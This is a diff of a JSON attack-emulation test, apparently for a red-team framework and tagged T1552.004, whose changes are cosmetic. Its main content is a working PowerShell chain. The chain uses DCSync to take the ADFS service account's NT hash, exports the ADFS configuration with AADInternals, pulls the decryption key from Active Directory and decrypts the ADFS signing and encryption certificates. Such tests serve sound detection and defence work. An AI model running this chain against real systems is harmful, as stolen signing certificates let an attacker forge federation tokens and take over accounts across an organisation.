@@ -7,87 +7,87 @@
   ],
   "steps": [
     {
-      "id": "adb72689-9df2-4d11-a34d-71717f5db021",
+      "id": "d96994ad-35ae-4161-b4d3-2b8412d49529",
       "type": "execute-command",
       "data": {
-        "command": "Import-Module ActiveDirectory -Force \nImport-Module AADInternals -Force | Out-Null\n#Get Configuration\n$dcServerName = (Get-ADDomainController).HostName\n$svc = Get-ADObject -filter * -Properties objectguid,objectsid | Where-Object name -eq \"#{adfs_service_account_name}\"\n$PWord = ConvertTo-SecureString -String \"#{replication_password}\" -AsPlainText -Force\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList #{replication_user}, $PWord\n# use DCSync to fetch the ADFS service account's NT hash\n$hash = Get-AADIntADUserNTHash -ObjectGuid $svc.ObjectGuid -Credentials $Credential -Server $dcServerName -AsHex\n$ADFSConfig = Export-AADIntADFSConfiguration -Hash $hash -SID $svc.Objectsid.Value -Server #{adfs_server_name}\n# Get certificates decryption key\n$Configuration = [xml]$ADFSConfig\n$group = $Configuration.ServiceSettingsData.PolicyStore.DkmSettings.Group\n$container = $Configuration.ServiceSettingsData.PolicyStore.DkmSettings.ContainerName\n$parent = $Configuration.ServiceSettingsData.PolicyStore.DkmSettings.ParentContainerDn\n$base = \"LDAP://CN=$group,$container,$parent\"\n$ADSearch = [System.DirectoryServices.DirectorySearcher]::new([System.DirectoryServices.DirectoryEntry]::new($base))\n$ADSearch.Filter = '(name=CryptoPolicy)'\n$ADSearch.PropertiesToLoad.Clear()\n$ADSearch.PropertiesToLoad.Add(\"displayName\") | Out-Null\n$aduser = $ADSearch.FindOne()\n$keyObjectGuid = $ADUser.Properties[\"displayName\"] \n$ADSearch.PropertiesToLoad.Clear()\n$ADSearch.PropertiesToLoad.Add(\"thumbnailphoto\") | Out-Null\n$ADSearch.Filter=\"(l=$keyObjectGuid)\"\n$aduser=$ADSearch.FindOne() \n$key=[byte[]]$aduser.Properties[\"thumbnailphoto\"][0] \n# Get encrypted certificates from configuration and decrypt them\nExport-AADIntADFSCertificates -Configuration $ADFSConfig -Key $key\nGet-ChildItem | Where-Object {$_ -like \"ADFS*\"}\nWrite-Host \"`nCertificates retrieved successfully\"\n",
+        "command": "Import-Module ActiveDirectory -Force \nImport-Module AADInternals -Force | Out-Null\n#Get Configuration\n$dcServerName = (Get-ADDomainController).HostName\n$svc = Get-ADObject -filter * -Properties objectguid,objectsid | Where-Object name -eq \"#{adfs_service_account_name}\"\n$PWord = ConvertTo-SecureString -String \"#{replication_password}\" -AsPlainText -Force\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList #{replication_user}, $PWord\n# use DCSync to fetch the ADFS service account's NT hash\n$hash = Get-AADIntADUserNTHash -ObjectGuid $svc.ObjectGuid -Credentials $Credential -Server $dcServerName -AsHex\n$ADFSConfig = Export-AADIntADFSConfiguration -Hash $hash -SID $svc.Objectsid.Value -Server #{adfs_server_name}\n# Get certificates decryption key\n$Configuration = [xml]$ADFSConfig\n$group = $Configuration.ServiceSettingsData.PolicyStore.DkmSettings.Group\n$container = $Configuration.ServiceSettingsData.PolicyStore.DkmSettings.ContainerName\n$parent = $Configuration.ServiceSettingsData.PolicyStore.DkmSettings.ParentContainerDn\n$base = \"LDAP://CN=$group,$container,$parent\"\n$ADSearch = [System.DirectoryServices.DirectorySearcher]::new([System.DirectoryServices.DirectoryEntry]::new($base))\n$ADSearch.Filter = '(name=CryptoPolicy)'\n$ADSearch.PropertiesToLoad.Clear()\n$ADSearch.PropertiesToLoad.Add(\"displayName\") | Out-Null\n$aduser = $ADSearch.FindOne()\n$keyObjectGuid = $ADUser.Properties[\"displayName\"] \n$ADSearch.PropertiesToLoad.Clear()\n$ADSearch.PropertiesToLoad.Add(\"thumbnailphoto\") | Out-Null\n$ADSearch.Filter=\"(l=$keyObjectGuid)\"\n$aduser=$ADSearch.FindOne() \n$key=[byte[]]$aduser.Properties[\"thumbnailphoto\"][0] \n# Get encrypted certificates from configuration and decrypt them\nExport-AADIntADFSCertificates -Configuration $ADFSConfig -Key $key\nGet-ChildItem | Where-Object {$_ -like \"ADFS*\"}\nWrite-Host \"`nCertificates retrieved successfully\"",
         "command_type": "powershell"
       },
       "elevation_required": false
     },
     {
-      "id": "a6dfe316-ac8b-4a2e-9c4a-602175c16759",
+      "id": "5810e6cc-f243-4f2f-97e0-3e904b79e5a6",
       "type": "execute-command",
       "data": {
-        "command": "Remove-Item -Path \".\\ADFS_encryption.pfx\" -ErrorAction Ignore\nRemove-Item -Path \".\\ADFS_signing.pfx\" -ErrorAction Ignore\n",
+        "command": "Remove-Item -Path \".\\ADFS_encryption.pfx\" -ErrorAction Ignore\nRemove-Item -Path \".\\ADFS_signing.pfx\" -ErrorAction Ignore",
         "command_type": "powershell"
       },
       "elevation_required": false
     },
     {
-      "id": "e3424491-e4d3-4580-9f32-efa2b41816f3",
+      "id": "8fd17b7e-64c5-494d-bafc-e7712fc39367",
       "name": "Check dependency 1/1",
       "description": "AADInternals and ActiveDirectory modules must be installed.\n",
       "type": "execute-command",
       "data": {
-        "command": "if ($(Get-Module AADInternals) -or $(Get-Module -ListAvailable -Name ActiveDirectory)) {echo 0} else {echo 1}\n",
-        "command_type": ""
+        "command": "if ($(Get-Module AADInternals) -or $(Get-Module -ListAvailable -Name ActiveDirectory)) {echo 0} else {echo 1}",
+        "command_type": "powershell"
       },
       "elevation_required": false
     },
     {
-      "id": "0071d551-342f-4fb5-b0f4-deab7f5c6ac4",
+      "id": "b723ac18-dc78-4129-aba1-f9447aff6880",
       "name": "Resolve dependency 1/1",
       "description": "AADInternals and ActiveDirectory modules must be installed.\n",
       "type": "execute-command",
       "data": {
-        "command": "Install-Module -Name AADInternals -Force\n",
-        "command_type": ""
+        "command": "Install-Module -Name AADInternals -Force",
+        "command_type": "powershell"
       },
       "elevation_required": false
     },
     {
-      "id": "fa6324c9-c6c1-49e1-bf20-70839aecee4d",
+      "id": "0fdef7b1-b475-42b4-ac1f-6110c11fb455",
       "name": "Re-check dependency 1/1",
       "description": "AADInternals and ActiveDirectory modules must be installed.\n",
       "type": "execute-command",
       "data": {
-        "command": "if ($(Get-Module AADInternals) -or $(Get-Module -ListAvailable -Name ActiveDirectory)) {echo 0} else {echo 1}\n",
-        "command_type": ""
+        "command": "if ($(Get-Module AADInternals) -or $(Get-Module -ListAvailable -Name ActiveDirectory)) {echo 0} else {echo 1}",
+        "command_type": "powershell"
       },
       "elevation_required": false
     }
   ],
   "flows": [
     {
-      "s": "adb72689-9df2-4d11-a34d-71717f5db021",
+      "s": "d96994ad-35ae-4161-b4d3-2b8412d49529",
       "p": "on-success",
-      "o": "a6dfe316-ac8b-4a2e-9c4a-602175c16759"
+      "o": "5810e6cc-f243-4f2f-97e0-3e904b79e5a6"
     },
     {
-      "s": "adb72689-9df2-4d11-a34d-71717f5db021",
+      "s": "d96994ad-35ae-4161-b4d3-2b8412d49529",
       "p": "on-failure",
-      "o": "a6dfe316-ac8b-4a2e-9c4a-602175c16759"
+      "o": "5810e6cc-f243-4f2f-97e0-3e904b79e5a6"
     },
     {
-      "s": "e3424491-e4d3-4580-9f32-efa2b41816f3",
+      "s": "8fd17b7e-64c5-494d-bafc-e7712fc39367",
       "p": "on-success",
-      "o": "adb72689-9df2-4d11-a34d-71717f5db021"
+      "o": "d96994ad-35ae-4161-b4d3-2b8412d49529"
     },
     {
-      "s": "e3424491-e4d3-4580-9f32-efa2b41816f3",
+      "s": "8fd17b7e-64c5-494d-bafc-e7712fc39367",
       "p": "on-failure",
-      "o": "0071d551-342f-4fb5-b0f4-deab7f5c6ac4"
+      "o": "b723ac18-dc78-4129-aba1-f9447aff6880"
     },
     {
-      "s": "0071d551-342f-4fb5-b0f4-deab7f5c6ac4",
+      "s": "b723ac18-dc78-4129-aba1-f9447aff6880",
       "p": "on-success",
-      "o": "fa6324c9-c6c1-49e1-bf20-70839aecee4d"
+      "o": "0fdef7b1-b475-42b4-ac1f-6110c11fb455"
     },
     {
-      "s": "fa6324c9-c6c1-49e1-bf20-70839aecee4d",
+      "s": "0fdef7b1-b475-42b4-ac1f-6110c11fb455",
       "p": "on-failure",
-      "o": "adb72689-9df2-4d11-a34d-71717f5db021"
+      "o": "d96994ad-35ae-4161-b4d3-2b8412d49529"
     }
   ],
   "tags": [
@@ -95,6 +95,12 @@
     "T1552.004"
   ],
   "input_arguments": [
+    {
+      "name": "adfs_service_account_name",
+      "type": "string",
+      "description": "Name of the ADFS service account",
+      "value": "adfs_svc"
+    },
     {
       "name": "replication_user",
       "type": "string",
@@ -112,12 +118,6 @@
       "type": "string",
       "description": "Name of an ADFS server",
       "value": "sts.contoso.com"
-    },
-    {
-      "name": "adfs_service_account_name",
-      "type": "string",
-      "description": "Name of the ADFS service account",
-      "value": "adfs_svc"
     }
   ]
 }
